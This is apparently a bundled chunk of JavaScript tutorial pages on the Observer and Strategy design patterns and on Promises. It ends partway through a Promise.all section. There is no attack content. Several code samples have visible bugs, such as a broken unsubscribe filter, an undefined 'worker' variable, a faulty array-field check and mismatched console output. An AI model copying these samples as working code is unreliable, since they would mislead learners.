1\n\nSuppose there is an array of identifiers for the elements:\n\n~~~js\nconst inputs = ['author', 'topic', 'message']\n~~~\n\nLet's declare a helper function that creates and inserts an element on the page:\n\n~~~js\nconst addElem = (tag = 'input', container = document.body) => (container.nodeType === 1 ? container : document.body)\n  .appendChild(document.createElement(tag))\n~~~\n\n## ![ico-25 cap] observed\n\nLet's create an array of ~input~ elements:\n\n~~~js\nconst observed = inputs  \n  .map(item => {\n    const elem = Object.assign(addElem(), {\n      id: item,\n      innerText: item,\n      placeholder: item\n    })\n    return elem\n  })\n~~~\n\nSo, the user can change the model data at any time.\n\n_________________________________________________________\n\n### ![ico-25 cap] createSubscriber\n\nLet's declare **~createSubscriber~** function:\n\n~~~js\nfunction createSubscriber (prop, tagName, container = section) {\n  const elem = addElem(tagName)\n  return function update (data) {\n    data[prop] && Object.assign(elem, {\n      innerText: data[prop]\n    })\n  }\n}\n~~~\n\n___________________________________________\n\n### ![ico-25 cap] Class Observer\n\nand finally, the **~Observer~** class:\n\n~~~js\nclass Observer {\n  constructor (subjects) {\n    Object.assign(this, {\n      subscribers: [],\n      events: subjects.map(function (elem) {\n        elem.oninput = function (event) {\n          this.broadcast({ [elem.id]: event.target.value })\n        }.bind(this)\n        return elem.oninput\n      }, this)\n    })\n  }\n\n  subscribe (client) {\n    typeof client === 'function'\n      ? this.subscribers.push(client)\n      : console.error('Invalide subscriber: ' + client)\n  }\n\n  unsubscribe (client) {\n    this.subscribers = this.subscribers.filter(subscriber !== client)\n  }\n\n  broadcast (data) {\n    this.subscribers.forEach(client => client(data))\n  }\n}\n~~~\n\nThe array **_~subjects~_** is passed to the **~Observer~** class.\n\nThis is an array of references to ~input~ elements that ~observer~ will track.\n\nWhen element values change, the ~observer~ must notify all subscribers of the data update and send them the updated data.\n\n**Subscribers** are functions that will need to be called when model data changes.\nReferences to them will be stored in the **~subscribers~** array.\n\n• To subscribe to observer notifications, you need to call its **~subscibe~** method.\n• In order to unsubscribe from observer notifications, you need to call its **~unsubscibe~** method.\n• There is a **~broadcast~** method to notify subscribers.\n\n### ![ico-25 cap] Observer instance\n\nThe only thing left to do is to create an instance of **~Observer~**, passing it references to observed elements:\n\n~~~js\nconst observer = new Observer(observed)\n~~~\n\nand subscribers that the **~observer~** will notify about data changes:\n\n~~~js\nobserver.subscribe(createSubscriber('topic', 'h3')),\nobserver.subscribe(createSubscriber('message', 'p')),\nobserver.subscribe(createSubscriber('author', 'small'))\n~~~\n\nNow, when the values in ~input~ fields change, the created subscribers will be reactively updated.\n\n_____________________________________\n\nIf you \"subscribe\" to model data updates, the console.log method:\n\n~~~js\nobserver.subscribe(outputDevice.write)\n~~~\n\nthen the changes will be reflected not only on the page, but also in the console.\n\nAs a result of trying to create a subscriber without passing an argument:\n\n~~~js\nobserver.subscibe(null)\n~~~\n\nwe'll get a message from the observer:\n\n••Invalide subscriber••\n\n_________________________________________\n\n### ![ico-25 slider-button] Demo 1\n\n{{{pattern-observer.js}}}\n____________________________________________________\n\n### ![ico-25 icon] Full code snippet\n\n~~~~js\nconst inputs = ['topic', 'message', 'author']\n\nconst addElem = (tag = 'input', container = section) => (container.nodeType === 1 ? container : section)\n  .appendChild(document.createElement(tag))\n\nObject.assign(addElem('style'), {\n  textContent: `\n    input {\n      display: block;\n      padding: 4px 12px;\n      margin-left: 16px;\n    }\n  `\n})\n\nconst observed = inputs  \n  .map(item => {\n    const elem = Object.assign(addElem(), {\n      id: item,\n      innerText: item,\n      placeholder: item\n    })\n    return elem\n  })\n\nfunction createSubscriber (prop, tagName, container = section) {\n  const elem = container.appendChild(document.createElement(tagName))\n  return function update (data) {\n    data[prop] && Object.assign(elem, {\n      innerText: data[prop]\n    })\n  }\n}\n\nclass Observer {\n  constructor (subjects) {\n    Object.assign(this, {\n      subscribers: [],\n      events: subjects.map(function (elem) {\n        elem.oninput = function (event) {\n          this.broadcast({ [elem.id]: event.target.value })\n        }.bind(this)\n        return elem.oninput\n      }, this)\n    })\n  }\n\n  subscribe (client) {\n    typeof client === 'function'\n      ? this.subscribers.push(client)\n      : console.error('Invalide subscriber: ' + client)\n  }\n\n  unsubscribe (client) {\n    this.subscribers = this.subscribers.filter(subscriber !== client)\n  }\n\n  broadcast (data) {\n    this.subscribers.forEach(client => client(data))\n  }\n}\n\nconst observer = new Observer(observed)\n\nobserver.subscribe(createSubscriber('topic', 'h3')),\nobserver.subscribe(createSubscriber('message', 'p')),\nobserver.subscribe(createSubscriber('author', 'small'))\n~~~~\n\n____________________________________________________\n\n## ![ico-30 cap] Example 2\n\nLet's change the statement of the problem.\nChanges to model data values are not always initiated by the user.\nThat is, we will not have form elements with such a convenient ~onchange~ property at our disposal.\n\nSuppose you want to track changes in the values of the elements of the ~observed~ array:\n\n~~~js\nconst observed = ['topic', 'message', 'author']\n~~~\n\n**~createSubscriber~** function can be borrowed from the previous example, but the **~Observer~** class is slightly different.\n\n### ![ico-25 cap] Class Observer\n\n~~~js\nclass Observer {\n  constructor (subjects) {\n    Object.assign(this, {\n      subjects: {\n        oldValues: JSON.parse(JSON.stringify(subjects)),\n        newValues: subjects\n      },\n      subscribers: []\n    })\n\n    this.check()\n  }\n\n  check () {\n    const modified = this.subjects.newValues.filter((item, index) => item !== this.subjects.oldValues[index])\n    if (modified.length) {\n      this.subjects.oldValues = JSON.parse(JSON.stringify(this.subjects.newValues))\n      this.broadcast(this.subjects.newValues)\n    }\n    requestAnimationFrame(this.check.bind(this))\n  }\n\n  subscribe (client) {\n    typeof client === 'function'\n      ? this.subscribers.push(client)\n      : console.error('Invalide subscriber: ' + client)\n    this.broadcast(this.subjects.newValues)\n  }\n\n  unsubscribe (client) {\n    this.subscribers = this.subscribers.filter(subscriber !== client)\n  }\n\n  broadcast (data) {\n    this.subscribers.forEach(client => client(data))\n  }\n}\n\nconst observer = new Observer(observed)\n~~~\n\nAs you can see, each \"subscriber\" keeps track of a separate element of the array.\nWhen we create a subscriber, we pass it the index of the tracked item:\n\n~~~js\nobserver.subscribe(createSubscriber(0, 'h3')),\nobserver.subscribe(createSubscriber(1, 'p')),\nobserver.subscribe(createSubscriber(2, 'small'))\n~~~\n\nWhen a new subscriber registers, the current value of the array element being tracked is passed to the subscriber.\nLet's make the values of the elements of the tracked array change after a while:\n\n~~~js\nconst getRandom = num => Math.max(Math.round(Math.random() * num), 1000)\n\nsetTimeout(() => { observed[0] = 'new topic' }, getRandom(5000))\nsetTimeout(() => { observed[1] = 'new message' }, getRandom(7000))\nsetTimeout(() => { observed[2] = 'new author' }, getRandom(8000))\n~~~\n\nand see how our solution works.\n\n### ![ico-25 slider-button] Demo 2\n\n{{{pattern-observer-1.js}}}\n"},28703:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-30 study] Design Patterns\n\n_____________________________________\n\n### ![ico-20 icon] Strategy\n\nThis is a **behavioral** pattern.\n\nIt allows you to describe several strategies of the object's behavior with the ability to choose the desired strategy.\n\n_______________________________\n\nFirst, let's create a few helper modules, which you can then import into the main module of the class.\n\n^^^[helpers/validStrategyNames.js]\n~~~js\nexport const validStrategyNames = [\n  'sum-of-all-numeric-fields',\n  'array-field-length',\n  'key'\n]\n~~~\n^^^\n\nLet's create the helper functions ~strategyError~, ~dataError~, ~keyError~, ~keyPropError~, ~arrayFieldError~:\n\n^^^[helpers/strategyError.js]\n~~~js\nexport function strategyError () {\n  const stack = `\n    Valid strategy names:<br>\n      • sum-of-all-numeric-fields<br>\n      • array-field-length<br>\n      • key (key name should be third argument.)\n  `\n  throw Object.assign(new Error('Invalid strategy.'), {\n    name: 'Invalid strategy.',\n    message: 'First argument should be the name of strategy.',\n    stack\n  })\n}\n~~~\n^^^\n\n^^^[helpers/dataError.js]\n~~~js\nexport function dataError () {\n  throw Object.assign(new Error('Sorting error'), {\n    name: 'Source data error.',\n    message: 'Invalid source data.',\n    stack: 'Source data should be the array of objects.'\n  })\n}\n~~~\n^^^\n\n^^^[helpers/keyError.js]\n~~~js\nexport function keyError () {\n  throw Object.assign(new Error('Sorting error'), {\n    name: 'Sorting key error.',\n    message: 'Empty key field.',\n    stack: 'Third argument should be the name of key field.'\n  })\n}\n~~~\n^^^\n\n^^^[helpers/keyPropError.js]\n~~~js\nexport function keyPropError (key) {\n  throw Object.assign(new Error('Sorting error'), {\n    name: 'Sorting error.',\n    message: `Invalid key ${key}.`,\n    stack: `There is no prop  in source data.`\n  })\n}\n~~~\n^^^\n\n^^^[helpers/arrayFieldError.js]\n\n~~~js\nexport function arrayFieldError (key) {\n  throw Object.assign(new Error('Sorting error'), {\n    name: 'Sorting error.',\n    message: `Invalid key ${key}.`,\n    stack: `There is no prop  in source data.`\n  })\n}\n~~~\n^^^\n____________________________________\n\n^^^[helpers/testStrategy.js]\n~~~js\nimport { validStrategyNames } from './validStrategyNames'\nimport { strategyError } from './strategyError'\nimport { dataError } from './dataError'\nimport { keyError } from './keyError'\nimport { keyPropError } from './keyPropError'\nimport { arrayFieldError } from './arrayFieldError'\n\nexport function testStrategy (strategyName, data, key) {\n  if (!validStrategyNames.includes(strategyName)) return strategyError()\n\n  if (!Array.isArray(data)) return dataError()\n\n  if (strategyName === 'key' && !key) return keyError()\n\n  if (strategyName === 'key' && !data.filter(record => record[key]).length) {\n    return keyPropError(key)\n  }\n\n  if (strategyName === 'array-field-length') {\n    const err = data\n      .filter(record => Object.keys(record).filter(key => Array.isArray(record[key]).length))\n      .length\n\n    if (err) arrayFieldError()\n  }\n}\n~~~\n^^^\n____________________________________\n\nLet's create a **SortStrategy** class.\nAn instance of this class will sort the resulting array of objects according to the specified strategy.\nIn this example, the instance can use three collation strategies:\n\n| **key** | Sort by a given key.<br>^^Each element (object) of the array must have a property with an appropriate name.^^ |\n| **sum-of-all-numeric-fields** | Sort by the sum of all numeric properties of the object.<br>^^All numeric properties of the object that is an element of the original (sorted) array will be summed.<br>The source array will be sorted by the sum of the numeric properties of the objects.^^ |\n| **array-field-length** | Sort by length of the array property.<br>^^All objects that are elements of the original (sortable) array must have an array property.<br>The source array will be sorted by the length of the property array.^^ |\n\nSwitching from one strategy to another occurs by changing the **valueOf** property of each element of the source array.\n\n^^^[class SortStrategy]\n~~~js\nimport { testStrategy } from './helpers/testStrategy'\n\nclass SortStrategy  {\n  constructor () {\n    Object.assign(this, {\n      strategy: null,\n      testStrategy\n    })\n  }\n\n  sort (algorithm, data, key) {\n    this.testStrategy(algorithm, data, key)\n\n    this[algorithm](data)\n\n    data.forEach((record, index, arr) => {\n      let current = index, prev = index\n      while (--prev >= 0) {\n        if (arr[current] + 0 < arr[prev] + 0) {\n          ;[arr[prev], arr[current]] = [arr[current], arr[prev]]\n          current = prev\n        }\n      }\n    })\n  }\n\n  'sum-of-all-numeric-fields' (arrayOfObjects) {\n    return arrayOfObjects\n      .map(item => item.valueOf = function () {\n         return Object.keys(this)\n           .reduce((res, prop) => res += Number(this[prop]) || 0, 0)\n      })\n  }\n\n  'array-field-length' (arrayOfObjects) {\n    return arrayOfObjects\n      .map(item => item.valueOf = function () {\n        const propName = Object.keys(this)\n          .find(prop => Array.isArray(this[prop]))\n        return this[propName].length\n      })\n  }\n\n  'key' (arrayOfObjects, keyField) {\n    return arrayOfObjects\n      .map((item, index, array) => Object.assign(array[index], {\n        valueOf () { return this[keyField] }\n      }))\n  }\n}\n~~~\n^^^\n\nNow let's deal with the initial data. We will use three arrays of objects with a different set of properties.\n\n^^^[salary]\n~~~js\nconst salary = [\n  { name: 'Stephan', jan: 5000, fab: 5200, mar: 5800, apr: 4950, may: 4700, jun: 5100, jul: 5300, aug: 5000, sep: 4900, nov: 4800, dec: 5500 },\n  { name: 'Georg', jan: 2000, fab: 2200, mar: 2500, apr: 2550, may: 2400, jun: 2800, jul: 2100, aug: 2000, sep: 2200, nov: 2450, dec: 2700 },\n  { name: 'Mary', jan: 3100, fab: 3200, mar: 3000, apr: 3400, may: 3000, jun: 3300, jul: 3400, aug: 3700, sep: 3800, nov: 3700, dec: 3900 },\n  { name: 'Piter', jan: 2000, fab: 2250, mar: 1800, apr: 1950, may: 2100, jun: 2100, jul: 2700, aug: 2500, sep: 2900, nov: 2800, dec: 4000 },\n  { name: 'Helen', jan: 2000, fab: 2100, mar: 1700, apr: 1900, may: 2000, jun: 2000, jul: 2500, aug: 2000, sep: 2400, nov: 2700, dec: 3500 },\n  { name: 'Michael', jan: 3000, fab: 3200, mar: 2800, apr: 2950, may: 2700, jun: 3100, jul: 3300, aug: 4000, sep: 3900, nov: 3800, dec: 4500 },\n  { name: 'Andry', jan: 2800, fab: 2700, mar: 2800, apr: 2750, may: 2700, jun: 2500, jul: 2800, aug: 2700, sep: 2700, nov: 2800, dec: 3000 }\n]\n~~~\n^^^\n\n^^^[workers]\n~~~js\nconst workers = [\n  { name: 'Stephan', payments: [5000, 5200, 5800, 4950, 4700, 5100, 5300, 5000, 4900, 4800, 5500] },\n  { name: 'Georg', payments: [2000, 2200, 2500, 2550, 2400, 2800, 2100, 2000, 2200] },\n  { name: 'Mary', payments: [900, 700, 1000, 1200, 200, 400, 250] },\n  { name: 'Piter', payments: [1000, 2050, 1800, 700, 300, 500] },\n  { name: 'Helen', payments: [200, 210, 170, 190, 200] },\n  { name: 'Michael', payments: [3000, 3200, 2800, 2950] },\n  { name: 'Andry', payments: [1000, 1000, 900, 950] }\n]\n~~~\n^^^\n\n^^^[users]\n~~~js\nconst users = [\n  { name: 'Stephan', age: 30, works: 7, children: 2 },\n  { name: 'Georg', age: 25, works: 2, children: 1 },\n  { name: 'Mary', age: 34, works: 10, children: 1 },\n  { name: 'Piter', age: 50, works: 25, children: 3 },\n  { name: 'Helen', age: 40, works: 20, children: 3 },\n  { name: 'Michael', age: 38, works: 16, children: 2 },\n  { name: 'Andry', age: 45, works: 20, children: 2 }\n]\n~~~\n^^^\n\nThe only thing left to do is to create an instance of the **SortStrategy** class:\n~~~js\nconst sortStrategy = new SortStrategy\n~~~\n\nand check how it works.\n\n~~~js\nfunction sort (algorithm, data, key) {\n  try {\n    sortStrategy.sort(algorithm, data, key)\n    console.log(data)\n  } catch (error) {\n    console.warn(error)\n  }\n}\n\nsort('sum-of-all-numeric-fields', salary)\nsort('key', users, 'name')\nsort('array-field-length', worker)\n~~~\n\n{{{pattern-strategy.js}}}\n"},53986:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-35 study] Promise\n\n__________________________________________________________________________________________\n\n## ![ico-30 icon] Constructor\n\nConstructor **~Promise~** is a **higher-order function**.\nThis means that the constructor **~Promise~** expects a **function** as a **required argument**.\n\n~~~js\nconst promise = new Promise(function (...) {\n  ...\n})\n~~~\n\nIf you call constructor **~Promise~** without an argument:\n\n~~~js\nconst promise = new Promise ()\n~~~\n\n![ico-20 err] an exception will be thrown:\n\n~~~error\n    Uncaught TypeError: Promise resolver undefined is not a function\n~~~\n\n__________________________________________________________________________________________\n\n### ![ico-25 icon] Function-argument\n\nThe function-argument of the **~Promise~** constructor is also a **higher-order function**, i.e. its formal parameters are **functions**.\n^^Moreover, its formal parameters are callback functions.^^\n\nThe function-argument will be called when the **~Promise~** instance is created.\nLet's try passing to the **~Promise~** constructor the reference to a function without formal parameters:\n\n~~~js\nconsole.log('Start')\n\nnew Promise(() => console.log('Promise starts'))\n\nconsole.log('End')\n~~~\n\n~~~console\nStart\nPromise starts\nEnd\n~~~\n\nAs we can see, the **~Promise~** constructor called the anonymous function passed to it.\nSo, we've passed a function to **~Promise~** constructor, and the last one has called this function.\n\nSo far, no async stuff.\n\n_____________________________________\n\n### ![ico-25 icon] Instance\n\nLet's see what the **~Promise~** constructor creates:\n\n~~~js\nconst promise = new Promise(() => console.log('Promise starts'))\nconsole.log(promise)\n~~~\n\n~~~console\nPromise starts\n\n▼ Promise {<pending>}\n  ▼ [[Prototype]]: Promise\n    ► catch: ƒ catch()\n    ► constructor: ƒ Promise()\n    ► finally: ƒ finally()\n    ► then: ƒ then()\n      Symbol(Symbol.toStringTag): \"Promise\"\n    ► [[Prototype]]: Object\n    [[PromiseState]]: \"pending\"\n    [[PromiseResult]]: undefined\n~~~\n\nSo we have an instance that has a ~[[[PromiseState]]~ property set to \"**~pending~**\" and a ~[[PromiseResult]]~ property set to **~undefined~**.\n\n^^These properties can be seen in the debugger console, but the script does not have access to them.^^\nAlso, we see three \"inherited\" methods: **~then~**, **~catch~**, and **~finally~**, which we'll discuss further.\n\n__________________________________________\n\n### ![ico-25 icon] Static methods\n\nLet's also see what static methods the **~Promise~** constructor has.\n\n~~~js\nconsole.dir(Promise)\n~~~\n\n~~~console\n▼ ƒ Promise()\n  ►  all: ƒ all()\n  ►  allSettled: ƒ allSettled()\n  ► any: ƒ any()\n  length: 1\n  name: \"Promise\"\n  ► prototype: Promise {Symbol(Symbol.toStringTag): 'Promise', then: ƒ, catch: ƒ, finally: ƒ}\n  ► race: ƒ race()\n  ► reject: ƒ reject()\n  ► resolve: ƒ resolve()\n  ► withResolvers: ƒ withResolvers()\n  ► Symbol(Symbol.species): ƒ Promise()\n  ► Symbol(Symbol.species): ƒ Promise()\n    arguments: (...)\n    caller: (...)\n  ► [[Prototype]]: ƒ ()\n~~~\n\nLet’s see what they can do.\n\n~~~js\nconst promise = Promise.resolve('Hello')\nconsole.log(promise)\n~~~\n\n~~~console\n▼ Promise {<fulfilled>: 'Hello'}\n  ► [[Prototype]]: Promise\n    [[PromiseState]]: \"fulfilled\"\n    [[PromiseResult]]: \"Hello\"\n~~~\n\nOk, we have received an instance whose state is no longer “~pending~”, but “**~fulfilled~**”.\nAnd the result is no longer ~undefined~, but \"**Hello**\".\n\n~~~js\nconst promise = Promise.reject('Access denied.')\nconsole.log(promise)\n~~~\n\n~~~console\n▼ Promise {<rejected>: 'Access denied.'}\n  ► [[Prototype]]: Promise\n    [[PromiseState]]: \"rejected\"\n    [[PromiseResult]]: \"Access denied.\"\n~~~\n\nNow we have an instance whose state is no longer \"~pending~\", not \"~fulfilled~\", but \"**~rejected~**\".\nAnd the result is \"**Access denied.**\".\n\nThose, we have received an object that can have different states (~[[PromiseState]]~), and which can have content (~[[PromiseResult]]~).\nIt's pretty much like a closed box that might have something inside (~[[PromiseResult]]~).\n\nSo, an instance of the **~Promise~** constructor will be in one of three possible states:\n\n| **pending** | **fulfilled** | **rejected** |\n| ^^No contents yet (box empty)^^ | ^^The result is in the box^^  | ^^There is an error message in the box^^ |\n\n_________________________________________\n\n![ico-35 coffee]\n\nLet's say you walked into a café where there are no waiters and you placed an order ![ico-35 egg].\nAt the same time, a box appears on the table in front of you, and at some point the answer to your order will appear in this box.\nThe answer will not appear immediately, since it takes time to transfer the order to the kitchen.\nThe answer may be positive (then the ![ico-35 egg] will will appear in the box),\nor negative if the chef can't cook the ![ico-35 egg] right now due to a lack of necessary ingredients.\n\nThe trick is that you can't peek inside the box to see if something's come up or not.\n\nWhile the box is empty, its state (~[[PromiseState]]~) will be **~pending~**.\nIf the ![ico-35 egg] appears in the box, the state (~[[PromiseState]]~) will become **~fulfilled~**.\nIf there's a rejection in the box, then the state (~[[PromiseState]]~) will become **~rejected~**.\n\n| **~PromiseState~** | **~PromiseResult~** |\n| **~pending~**      | ![ico-25 wait]      |\n| **~fulfilled~**    | ![ico-40 egg]       |\n| **~rejected~**     | ![ico-25 error]     |\n\nNow we need to figure out how to “pull” the values ​​of the ~[[PromiseState]]~ and ~[[PromiseResult]]~ properties from this instance.\nWe can see them in the console, but those properties aren't available for our code.\n\nBut we are really hungry.\n\nLet's try out the prototypal methods that are available to an instance of the **~Promise~** constructor.\n\n_______________________________________________________\n\n### ![ico-25 icon] Prototypal methods\n\nEach instance created by the **~Promise~** constructor “inherits” the methods **~then~**, **~catch~** and **~finally~** from the “daddy”.\n\nThe methods **~then~** and **~catch~**  are two “holes” in the box through which we can extract what is in this box.\nTo do this you need to “stick your hands” into these holes.\n\nBy \"hands\" we mean **functions**.\n\n![ico-25 warn] So the methods **~then~**, **~catch~** and **~finally~** are **higher-order functions** because their arguments must be **functions**.\n\nHowever, if you pass nothing or any other value that is not a function the method will not throw an exception, although the method will not work.\nThose the expression:\n\n~~~js\nPromise.resolve('Access granted.').then()\n~~~\n\nor:\n\n~~~js\nPromise.resolve('Access granted.').then(10)\n~~~\n\nwill be equivalent to the expression:\n\n~~~js\nPromise.resolve('Access granted.')\n~~~\n\nIt makes sense, since the method's job is to pass a callback function to the **Event Loop**, and if there's nothing to pass, the method will do nothing.\n\n![ico-25 warn] The methods **~then~**, **~catch~** and **~finally~** return an instance of **~Promise~**.\n\nThat is, once you create an instance of **~Promise~**, you can't \"escape\" the \"vicious circle\"; no matter what you do, the result will always be a new instance of **~Promise~**.\n\n#### ![ico-20 icon] catch\n\nThe function that we will pass to the **~catch~** method will pick up an error message if the request is rejected and the state of our “box” becomes **~rejected~**.\n\n~~~js\nconst promise = Promise.reject('Access denied.')\n~~~\n\n~~~error\n    Uncaught (in promise) Access denied.\n~~~\n\nLet's take exception handling seriously.\nIt’s very bad if the console turns red with error messages while your application is running.\n\n☼☼☼ Don't make the console blush for you ☼☼☼\n\n~~~js\nconst promise = Promise.reject('Access denied.').catch(console.log)\n~~~\n\n~~~console\n    ► Uncaught (in promise) Access denied.\n~~~\n\n#### ![ico-20 icon] then\n\nThrough the hole **~then~** you can stick two hands at once: one for the result, the other for the error message:\n\n~~~js\nconsole.log('Start')\nPromise.resolve('Access granted.').then(console.log, console.log)\nPromise.reject('Access denied.').then(console.log, console.log)\nconsole.log('Finish')\n~~~\n\n~~~console\nStart\nFinish\nAccess granted.\nAccess denied.\n~~~\n\n#### ![ico-20 icon] finally\n\nI think this method is quite simple.\n\n~~~js\nconsole.log('Start')\nPromise.resolve('Access granted.')\n  .then(console.log, console.log)\n  .finally(() => console.log('Finally'))\nPromise.reject('Access denied.').then(console.log, console.log)\nconsole.log('Finish')\n~~~\n\n~~~console\nStart\nFinish\nAccess granted.\nAccess denied.\nFinally\n~~~\n______________________________________________\n\n## ![ico-30 icon] Magic box\n\nSo, using the **~Promise~** constructor, you can create a magic box with two holes.\nAs we already realized, it's just impossible to peek into this box \"here and now.\"\nAccess to its contents is possible only through [►►►**Event Loop**►►►](page/Event-Loop).\nSo, you'll have to send callbacks for the result, and there's no other way to get the contents out of the box.\n\nLet's figure out why it is this way.\n\nActually, the **~Promise~** instance acts as a \"trap\" for the result of the asynchronous process.\n\nSince we don't know when the asynchronous process will end, we don't know when the state of the box will change and the contents will appear inside it.\n\nIf the box could be opened immediately, then most likely we would see an empty box.\nNow imagine that you are hovering near a box and waiting for the contents to appear inside it.\nThose you block the **Call Stack**.\nBut the contents cannot appear in the box while the Call Stack is busy.\nEven if the server response has already delivered, or the timer has expired...\nSo, you'll be stuck with an empty box in your hands. Plus, you'll lock the page.\n\nThe output: the code that created the **~Promise~** instance should finish running and free up the Call Stack.\n\nWhen we pass our callback functions through the holes **~then~**, **~catch~** and **~finally~** of the **~Promise~** instance, we free the call stack and we give the box the opportunity to get the desired result. Having received the result, the box will pass it on to one of our callback functions.\n\nNow let's go back to the constructor.\nWe know that when calling the **~Promise~** constructor, we must pass it a certain function (more precisely, a reference to a function).\n\n~~~js\nconst promise = new Promise(function (resolve, reject) {\n  ...\n})\n~~~\n\nThis function will be called immediately.\nBut this function has two formal parameters.\n\nHere you should have a completely reasonable question:\nif we pass the **~Promise~** constructor a reference to a function, but we do not pass any arguments to call that function, then how can the constructor call it?\nAfter all, the constructor should pass  an arguments to this function when calling?\n\n◘◘![ico-25 coffee] ** 2**◘◘\n~~~js\nconst promise = (function (startTime) {\n  const interval = Math.round(Math.random() * 5000)\n\n  function recurse (callback) {\n    Date.now() - startTime < interval\n      ? requestAnimationFrame(recurse.bind(null, callback))\n      : callback(Date.now() - startTime)\n  }\n\n  return new Promise(resolve => recurse(resolve))\n})(Date.now())\n\npromise.then(console.log)\n~~~\n\nIn this example, we see that we send the **~console.log~** callback after the **~Promise~** instance has been created.\nAnd we couldn’t have done this before, since we use its **~then~** method to pass the callback.\n\nThis is precisely the magic of our two-hole box.\nThe box itself will send its own callback functions to the [►►►**Event Loop**►►►](page/Event-Loop) for the result.\n\nLet's see what happens if we create the **~Promise~** instance much earlier than we'll transfer the callback functions using the **_~then~_** and **_~catch~_** methods.\n\n~~~js\nvar test = new Promise(resolve => resolve(`Time: ${new Date().getSeconds()}/`))\n~~~\n\nAfter waiting a few seconds, let's execute the code:\n\n~~~js\ntest.then(data => console.log(data, new Date().getSeconds()))\n~~~\n\nIn the console we will see something like:\n\n~~~console\nStart\nEnd\nTime: 24/ 36\n~~~\n\nThose. at the time the promise **~test~** was created, it was 24 seconds, and when we added callbacks, it was already 36 seconds.\nBut the trick is that, although we “stuck our hands” into the **~then~** hole a few seconds later, the magic box saved for us the result that was obtained earlier.\n\nImagine that you launched several asynchronous processes, received several \"magic boxes\", and put them on a shelf.\nYou can get out the contents of the boxes at any time convenient for you and in any sequence convenient for you.\n\nTo illustrate this, let's use the anonymous function from the previous example, but now give it the name **~createPromise~** and modify it a little:\n\n~~~js\nfunction createPromise (startTime, title) {\n  const interval = Math.round(Math.random() * 5000)\n  function recurse (callback) {\n    const time = Date.now() - startTime\n    time < interval\n      ? requestAnimationFrame(recurse.bind(null, callback))\n      : callback(`${title}: ${Date.now() - startTime}`)\n  }\n  return new Promise(resolve => recurse(resolve))\n}\n~~~\n\nNow let's use it to create three instances of **~Promise~**:\n\n◘◘![ico-25 cap] ** 3**◘◘\n~~~js\nconst first = createPromise(Date.now(), 'first')\nconst second = createPromise(Date.now(), 'second')\nconst third = createPromise(Date.now(), 'third')\n\nfirst.then(console.log)\nsecond.then(console.log)\nthird.then(console.log)\n~~~\n\nAs we can see, these three instances are resolved in a random order, depending on the value of the random variable **~interval~**, which is determined at the time the instance is created.\n\n{{{promise-03.js}}}\n\nSuppose we need to strictly follow the output order: first → second → third.\nTo do this, let’s use the “magical” properties of our “box with two holes”:\n\n◘◘![ico-25 cap] ** 4**◘◘\n~~~js\nconst first = createPromise(Date.now(), 'first').then(console.log)\nconst second = createPromise(Date.now(), 'second')\nconst third = () => createPromise(Date.now(), 'third').then(console.log)\n\nfirst.then(() => second.then(console.log).then(third))\n~~~\n\n{{{promise-04.js}}}\n\n__________________________________________________________________________________________\n\n## ![ico-25 icon] \"Bundles\" of promises\n\nContinuing to study the static methods of the **~Promise~** constructor, we discover that in addition to **~Promise.resolve~** and **~Promise.reject~**, there are a number of useful methods with which we can serve entire collections of promises at once.\nThe main thing is that these collections should be **iterable**.\n\nWhen we run several asynchronous operations in parallel, we find ourselves in the storm of callback functions returning to us.\n\n@@@@\nImagine a tennis court and a cannon fires balls at a rate of five balls per second, and you have to catch them.<br>What if there are two cannons? Three cannons?...\n![](illustrations/promise-all.jpg)\n@@@@\n\nOf course, promises make things easier.\nThese \"magic boxes\" act as \"traps\" for the balls.\nWe can \"get the balls\" from these \"boxes\" using the method **~then~**.\n\nThings get more complicated if you need the results of these asynchronous operations in a given order.\n\n~~~js\nconst data = ['first', 'second', 'third', 'fourth', 'fifth', 'sixth', 'seventh', 'eighth', 'ninth']\nconst random = num => Math.round(Math.random() * num)\n\nconst promises = data\n  .map(item => new Promise(resolve => setTimeout(() => resolve(item), random(5000))))\npromises.forEach(promise => promise.then(console.log))\n~~~\n\n{{{promise-arrays-01.js}}}\n\nThis clearly suggests a solution of this kind:\n\n~~~js\nconst data = ['first', 'second', 'third', 'fourth', 'fifth', 'sixth', 'seventh', 'eighth', 'ninth']\nconst random = num => Math.round(Math.random() * num)\n\nconst promises = data\n  .map(item => new Promise(resolve => setTimeout(() => resolve(item), random(5000))))\n\nconst results = []\nconst start = Date.now()\npromises\n  .forEach((promise, index) => promise.then(value => { results[index] = { time: Date.now() - start, value } }))\n~~~\n\n{{{promise-arrays-02.js}}}\n\nThis is especially convenient if we need the results of several asynchronous operations simultaneously.\nWe can run several asynchronous operations, and process the received data in a \"batch\" when they all complete.\nHowever, in this case, we don't know when the array **~results~** will be ready.\nSo we need another promise which will resolve after all the promises in the array are resolved.\n\n◘◘![ico-25 cap] ** 5**◘◘\n\n~~~js\nconst data = ['first', 'second', 'third', 'fourth', 'fifth', 'sixth', 'seventh', 'eighth', 'ninth']\nconst random = num => Math.round(Math.random() * num)\n\nconst promises = data\n  .map(value => new Promise(resolve => setTimeout(() => resolve({ time: Date.now() - start, value }), random(5000))))\n\nconst results = new Array(promises.length).fill(null)\nconst start = Date.now()\npromises\n  .forEach((promise, index) => promise.then(response => { results[index] = response }))\n\nfunction recurse (resolve) {\n  results.filter(item => !item).length\n    ? setTimeout(recurse.bind(null, resolve), 400)\n    : resolve(results)\n}\n\nconst promise = new Promise(resolve => recurse(resolve))\n\npromise.then(console.log)\n~~~\n\nSo, next we will look at the static methods of the **~Promise~** constructor, which take as an argument a reference to **iterable collection of promises** and return **one promise**.\n\n@@@@\nI.e. let's \"pack\" several \"magic boxes\" into one \"magic box\".\n![](illustrations/promises-collection.png)\n@@@@\n\n__________________________________________\n\n### ![ico-20 icon] Promise.all\n\nThis method takes an iterable collection of promises, and returns a single promise, which will resolve with an iterable collection of results when all promises resolve.\nThe remarkable thing is that the order of responses in the results collection strictly corresponds to the order of promises in the original collection of promises.\n\n◘◘![ico-25 cap] ** 6**◘◘\n\n~~~js\nconst create = (message, time) => new Promise(resolve => setTimeout(() => resolve(message), time))\nconst show = message => document.body.appendChild(document.createElement('p')).innerText = message\n\nconst promises = [\n  create('Hello', 1000),\n  create('Bye', 3000),\n  create('How are you?', 2000)\n]\n\nPromise.all(promises)\n  .then(responses => responses.forEach(show))\n~~~\n\n![ico-20 warn] If there is a possibility of rejection of at least one of the promises, then our entire “package” will be rejected:\n\n~~~js\nconst executor = (resolve, 